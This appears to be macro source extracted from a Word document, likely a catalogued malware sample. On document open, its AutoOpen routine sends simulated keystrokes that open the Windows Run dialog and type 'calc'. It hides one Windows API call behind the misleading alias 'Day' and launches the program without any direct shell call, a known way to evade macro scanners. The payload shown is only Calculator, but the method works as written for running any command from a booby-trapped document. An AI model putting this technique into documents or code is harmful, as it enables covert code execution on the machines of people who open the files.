Attribute VB_Name = "NewMacros"
Private Declare Sub keybd_event Lib "user32.dll" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
Private Declare Function Day Lib "user32" Alias "VkKeyScanExA" (ByVal ch As Byte, ByVal dwhkl As Long) As Integer
 
Public Const KEYEVENTF_KEYDOWN = &H0 ' New definition
Public Const KEYEVENTF_EXTENDEDKEY = &H1 ' Key down flag
Public Const KEYEVENTF_KEYUP = &H2 ' Key up flag
Public Const VK_LCONTROL = &HA2 ' Left Control key code
Public Const VK_LWIN = &H5B
Public Const VK_TAB = &H9
Public Const VK_MENU = &H12
Public Const A = &H41 ' A key code
Public Const C = &H43 ' C key code
Public Const r = &H52 ' R key code

Sub autoopen()
    keybd_event VK_LWIN, 0&, KEYEVENTF_KEYDOWN, 0
    keybd_event r, 0&, KEYEVENTF_KEYDOWN, 0&
    keybd_event r, 0&, KEYEVENTF_KEYUP, 0&
    keybd_event VK_LWIN, 0&, KEYEVENTF_KEYUP, 0&
    
    'push down alt
keybd_event VK_MENU, 0&, 0&, 0&

'push down tab
keybd_event VK_TAB, 0&, 0&, 0&
'push up tab




keybd_event VK_TAB, 0&, KEYEVENTF_KEYUP, 0&

'then release alt
keybd_event VK_MENU, 0&, KEYEVENTF_KEYUP, 0&
    
Dim dt: dt = DateAdd("s", 1, Now()): Do Until (Now() > dt): Loop
    
Call keybd_event(Day(Asc("c"), 1&), KEYEVENTF_EXTENDEDKEY, 1&, 1&)
Call keybd_event(Day(Asc("a"), 1&), KEYEVENTF_EXTENDEDKEY, 1&, 1&)
Call keybd_event(Day(Asc("l"), 1&), KEYEVENTF_EXTENDEDKEY, 1&, 1&)
Call keybd_event(Day(Asc("c"), 1&), KEYEVENTF_EXTENDEDKEY, 1&, 1&)

End Sub






Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True


INQUEST-PP=macro
